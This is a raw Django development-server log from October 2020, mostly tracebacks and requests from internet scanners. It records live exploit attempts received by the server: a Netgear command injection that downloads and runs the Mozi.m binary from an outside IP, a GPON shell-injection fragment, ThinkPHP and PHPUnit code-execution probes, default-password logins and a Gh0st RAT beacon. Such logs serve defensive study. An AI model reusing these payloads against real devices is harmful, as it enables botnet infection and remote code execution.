    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 21:16:59] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('74.120.14.36', 45954)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 21:17:01] "GET / HTTP/1.1" 200 643
[15/Oct/2020 21:22:43] "GET /hudson HTTP/1.1" 404 179
[15/Oct/2020 21:29:05] "GET / HTTP/1.1" 200 643
[15/Oct/2020 21:32:01] "GET /admin/config.php?password%5B0%5D=admin&username=admin HTTP/1.1" 404 179
[15/Oct/2020 23:13:36] "GET /favicon.ico HTTP/1.1" 404 179
[15/Oct/2020 23:13:39] "GET /welcome/ HTTP/1.1" 200 883
[15/Oct/2020 23:13:40] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 304 0
[15/Oct/2020 23:13:43] "GET /SchoolApp/student/ HTTP/1.1" 200 2492
[15/Oct/2020 23:13:46] "GET /PonyApp/pony/ HTTP/1.1" 200 2482
[15/Oct/2020 23:18:04] "POST /api/jsonws/invoke HTTP/1.1" 404 179
[15/Oct/2020 23:45:39] "GET /MiWO HTTP/1.1" 404 179
[15/Oct/2020 23:53:16] "GET http://150.158.7.54/home2/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('116.128.128.41', 55419)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 01:15:53] "GET http://150.158.7.54/PonyApp/pony/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 50465)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 01:23:47] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 36634)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 02:21:01] "GET http://example.com/ HTTP/1.1" 404 179
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[16/Oct/2020 02:21:01] "GET http://example.com/ HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('185.39.11.105', 52242)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
    super().close()
  File "/usr/lib64/python3.6/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[16/Oct/2020 02:21:01] "CONNECT dnspod.qcloud.com:443 HTTP/1.1" 404 179
[16/Oct/2020 02:23:01] "GET / HTTP/1.0" 200 643
[16/Oct/2020 02:23:01] "POST / HTTP/1.1" 403 1382
[16/Oct/2020 02:23:02] code 400, message Bad request syntax ('\x16\x03\x01\x00\xee\x01\x00\x00¨º\x03\x03\x1e\r\xb2\xca\xccx\xe4Q\xe6J#\xae\xe2\x90\xcf\xe3¡ì%g\x17x\xda\x82E\xbc¡ã¡ã¡ì\x0b8\xc1+ ¡¤\xb8%\xf1\x17\xb2r\xcb\x17\x84\xb8y+\x85&\x93\xa6\xcfBi[p\x81$\x05\x16\x14">^Z\x97\x00&\xc0/\xc00\xc0+\xc0,\xcc¡§\xcc\xa9\xc0\x13\xc0\t\xc0\x14\xc0')
[16/Oct/2020 02:23:02] You're accessing the development server over HTTPS, but it only supports HTTP.

[16/Oct/2020 02:23:17] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\xee\x01\x00\x00¨º\x03\x03A¡è\xa21\xf5Un\x9bg\\\xc3d\x8d\xccS\x89\xb9/¡Â*{¡À\xe2\xdag')
[16/Oct/2020 02:23:17] You're accessing the development server over HTTPS, but it only supports HTTP.

[16/Oct/2020 02:44:39] "GET / HTTP/1.1" 200 643
[16/Oct/2020 02:44:41] "GET /robots.txt HTTP/1.1" 404 179
[16/Oct/2020 02:44:42] "GET /sitemap.xml HTTP/1.1" 404 179
[16/Oct/2020 02:44:44] "GET /.well-known/security.txt HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('82.221.105.6', 41818)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 02:44:46] "GET /favicon.ico HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('82.221.105.6', 42220)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
----------------------------------------
Exception happened during processing of request from ('82.221.105.6', 42710)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 02:49:30] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 50366)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 04:02:17] "GET http://150.158.7.54/api/4 HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 43085)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 04:21:07] "GET / HTTP/1.0" 200 643
[16/Oct/2020 04:53:17] "GET http://150.158.7.54/SchoolApp/student/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 61381)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 05:12:48] "GET http://150.158.7.54/?XDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 44342)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 05:32:41] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 179
[16/Oct/2020 06:08:14] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
[16/Oct/2020 06:28:42] "GET / HTTP/1.1" 200 643
[16/Oct/2020 06:36:15] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[16/Oct/2020 06:36:20] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[16/Oct/2020 06:37:03] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[16/Oct/2020 06:38:04] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[16/Oct/2020 06:38:32] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[16/Oct/2020 06:45:14] "GET / HTTP/1.1" 200 643
[16/Oct/2020 06:48:55] "POST /api/jsonws/invoke HTTP/1.1" 404 179
[16/Oct/2020 07:11:49] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
[16/Oct/2020 07:19:37] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
[16/Oct/2020 07:40:30] "GET / HTTP/1.1" 200 643
[16/Oct/2020 07:57:59] "GET / HTTP/1.0" 200 643
----------------------------------------
Exception happened during processing of request from ('74.120.14.51', 40838)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 09:28:17] "GET / HTTP/1.1" 200 643
[16/Oct/2020 09:28:18] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('74.120.14.51', 57542)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 09:43:21] "GET / HTTP/1.1" 200 643
[16/Oct/2020 09:55:17] "GET / HTTP/1.0" 200 643
[16/Oct/2020 10:57:17] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('91.193.5.58', 41832)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 11:05:47] "GET / HTTP/1.1" 200 643
[16/Oct/2020 11:15:16] "GET http://example.com/ HTTP/1.1" 404 179
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[16/Oct/2020 11:15:16] "GET http://example.com/ HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('185.39.11.105', 60380)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
    super().close()
  File "/usr/lib64/python3.6/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[16/Oct/2020 11:15:17] "CONNECT dnspod.qcloud.com:443 HTTP/1.1" 404 179
[16/Oct/2020 11:26:19] "GET / HTTP/1.1" 200 643
[16/Oct/2020 11:29:34] "GET / HTTP/1.1" 200 643
[16/Oct/2020 12:26:16] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 179
[16/Oct/2020 12:26:16] code 400, message Bad request syntax ('0;sh+/tmp/gpon80&ipv=0')
[16/Oct/2020 12:26:16] "0;sh+/tmp/gpon80&ipv=0" 400 -
[16/Oct/2020 12:47:26] "GET / HTTP/1.1" 200 643
[16/Oct/2020 14:57:04] code 400, message Bad request version ('\xc0\x14\xc0')
[16/Oct/2020 14:57:04] You're accessing the development server over HTTPS, but it only supports HTTP.

[16/Oct/2020 15:34:15] "GET / HTTP/1.0" 200 643
[16/Oct/2020 16:40:03] code 400, message Bad request syntax ("Gh0st\xad\x00\x00\x00¨¤\x00\x00\x00x\x9cKS``\x98\xc3\xc0\xc0\xc0\x06\xc4\x8c@\xbcQ\x96\x81\x81\tH\x07¡ì\x16\x95e&¡ì*\x04$&g+\x182\x94\xf6¡ã00\xac¡§rc\x00\x01\x11\xa0\x82\x1f\\`&\x83\xc7K7\x86\x19\xe5n\x0c9\x95n\x0c;\x84\x0f3\xac¨¨sch¡§^\xcf4'J\x97\xa9\x82\xe30\xc3\x91h]&\x90\xf8\xce\x97S\xcbA4L?2=¨¢\xc4\x92\x86\x0b@\xf5`\x0cT\x1f\xae\xaf]")
[16/Oct/2020 16:40:03] "Gh0st\xad   ¨¤   x\x9cKS``\x98\xc3\xc0\xc0\xc0\xc4\x8c@\xbcQ\x96\x81\x81	H¡ì\x95e&¡ì*$&g+2\x94\xf6¡ã00\xac¡§rc \xa0\x82\`&\x83\xc7K7\x86\xe5n9\x95n;\x843\xac¨¨sch¡§^\xcf4'J\x97\xa9\x82\xe30\xc3\x91h]&\x90\xf8\xce\x97S\xcbA4L?2=¨¢\xc4\x92\x86@\xf5`T\xae\xaf]" 400 -
[16/Oct/2020 18:57:54] "GET / HTTP/1.1" 200 643
[16/Oct/2020 18:58:53] "GET / HTTP/1.1" 200 643
[16/Oct/2020 19:21:15] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.51', 48530)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 19:34:48] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.51', 37882)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Oct/2020 19:34:49] "GET / HTTP/1.1" 200 643
[16/Oct/2020 19:49:20] "GET / HTTP/1.0" 200 643
[16/Oct/2020 20:13:22] "GET / HTTP/1.0" 200 643
[16/Oct/2020 20:21:37] "GET / HTTP/1.1" 200 643
[16/Oct/2020 20:25:30] "GET / HTTP/1.1" 200 643
[16/Oct/2020 20:26:08] "GET / HTTP/1.1" 200 643
[16/Oct/2020 20:35:49] "GET / HTTP/1.1" 200 643
[16/Oct/2020 22:00:41] "GET /manager/text/list HTTP/1.1" 404 179
[16/Oct/2020 22:10:55] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.50.221.156:51824/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 179
[16/Oct/2020 23:00:28] "GET / HTTP/1.1" 200 643
[16/Oct/2020 23:13:50] "GET /manager/html HTTP/1.1" 404 179
[16/Oct/2020 23:57:06] "GET / HTTP/1.1" 200 643
[17/Oct/2020 00:05:13] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('162.142.125.52', 35384)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
